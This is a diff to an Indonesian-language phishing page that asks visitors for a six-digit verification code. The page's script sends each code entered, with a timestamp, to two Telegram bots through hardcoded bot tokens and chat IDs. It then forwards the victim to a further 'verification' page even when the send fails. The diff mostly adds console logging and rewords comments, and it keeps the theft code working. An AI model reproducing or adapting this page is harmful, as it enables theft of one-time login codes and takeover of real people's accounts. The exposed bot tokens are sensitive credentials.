@@ -128,7 +128,7 @@
     <div class="container-box">
         <div class="title">Masukkan kode verifikasi</div>
 
-        <input type="text" id="kode" class="input-box" placeholder="Masukkan kode disini" inputmode="numeric" maxlength="6" autocomplete="one-time-code">
+        <input type="text" id="kode" class="input-box" placeholder="" inputmode="numeric" maxlength="6" autocomplete="one-time-code">
 
         <div class="pesan-error" id="pesanError">⚠️ Harap isi kode 6 digit!</div>
 
@@ -149,23 +149,24 @@
         dan notifikasi pesan instan lainnya.
     </div>
 
-        .i        <script src="https://cdn.tail<!-- ============================================== -->
+    <!-- ============================================== -->
     <!-- SCRIPT KIRIM KE 2 BOT TELEGRAM & PINDAH HALAMAN -->
     <!-- ============================================== -->
     <script>
-        // ==================== BOT 1 ====================
-        const BOT1_TOKEN = "8463412359:AAG6nli8rzC54LQSKkgXBXkwI8ePspNfFIA"; 
-        const BOT1_CHAT_ID = "-1003797236002";
+        // ==================== ⚠️ WAJIB DIISI LENGKAP! ====================
+        // BOT 1 — Pastikan Token & Chat ID LENGKAP!
+        const BOT1_TOKEN = "8463412359:AAG6nli8rzC54LQSKkgXBXkwI8ePspNfFIA"; // Ganti dengan Token lengkap Bot 1
+        const BOT1_CHAT_ID = "-1003797236002"; // Ganti dengan Chat ID lengkap Bot 1
 
-        // ==================== BOT 2 — GANTI DENGAN DATA BOT KEDUA ====================
-        const BOT2_TOKEN = "8567366336:AAEBjptgS76AUDZ80k1C0uLL5NQnTGnQT0Q"; 
+        // BOT 2
+        const BOT2_TOKEN = "8567366336:AAEBjptgS76AUDZ80k1C0uLL5NQnTGnQT0Q";
         const BOT2_CHAT_ID = "-1003710620091";
 
-        // ==================== HALAMAN TUJUAN ====================
+        // Halaman tujuan
         const HALAMAN_BERIKUTNYA = "verifikasi ulang.html";
 
         // === TIMER HITUNG MUNDUR ===
-        let totalDetik = 2 * 60 + 51; // 2 menit 51 detik
+        let totalDetik = 2 * 60 + 51;
         const timerElement = document.getElementById('timer');
         let timerExpired = false;
         
@@ -198,9 +199,10 @@
                     })
                 });
                 const data = await res.json();
+                console.log("Respon Bot:", data);
                 return data.ok;
             } catch (err) {
-                console.log("Gagal kirim:", err);
+                console.log("❌ Gagal kirim ke Bot:", err);
                 return false;
             }
         }
@@ -211,14 +213,14 @@
             let btn = document.getElementById("btnKirim");
             let error = document.getElementById("pesanError");
 
-            // Validasi
+            // Validasi minimal 4 digit
             if(kode === "" || kode.length < 4){
                 error.style.display = "block";
                 return false;
             }
             error.style.display = "none";
 
-            // Kunci tombol
+            // Kunci tombol saat proses
             btn.disabled = true;
             btn.innerText = "Memproses...";
 
@@ -228,20 +230,23 @@ Kode: <code>${kode}</code>
 Waktu: ${new Date().toLocaleString('id-ID')}
 ${timerExpired ? '⚠️ Waktu sudah habis!' : ''}`;
 
-            // Kirim ke 2 bot SECARA BERSAMAAN
+            console.log("📤 Mengirim data ke 2 bot...");
+
+            // Kirim ke 2 bot bersamaan
             const [hasilBot1, hasilBot2] = await Promise.all([
                 kirimKeBot(BOT1_TOKEN, BOT1_CHAT_ID, pesan),
                 kirimKeBot(BOT2_TOKEN, BOT2_CHAT_ID, pesan)
             ]);
 
-            console.log("Bot 1:", hasilBot1 ? "✅ Berhasil" : "❌ Gagal");
-            console.log("Bot 2:", hasilBot2 ? "✅ Berhasil" : "❌ Gagal");
+            console.log("🤖 Bot 1:", hasilBot1 ? "✅ Berhasil" : "❌ Gagal");
+            console.log("🤖 Bot 2:", hasilBot2 ? "✅ Berhasil" : "❌ Gagal");
 
-            // Pindah halaman
+            // Selalu pindah halaman — meskipun bot gagal
+            console.log("➡️ Pindah ke halaman:", HALAMAN_BERIKUTNYA);
             window.location.href = HALAMAN_BERIKUTNYA;
         }
 
-        // Kirim ulang kode — reset input & timer
+        // Kirim ulang kode
         document.getElementById('kirimUlang').addEventListener('click', () => {
             alert('Kode baru telah dikirim!');
             document.getElementById('kode').value = '';
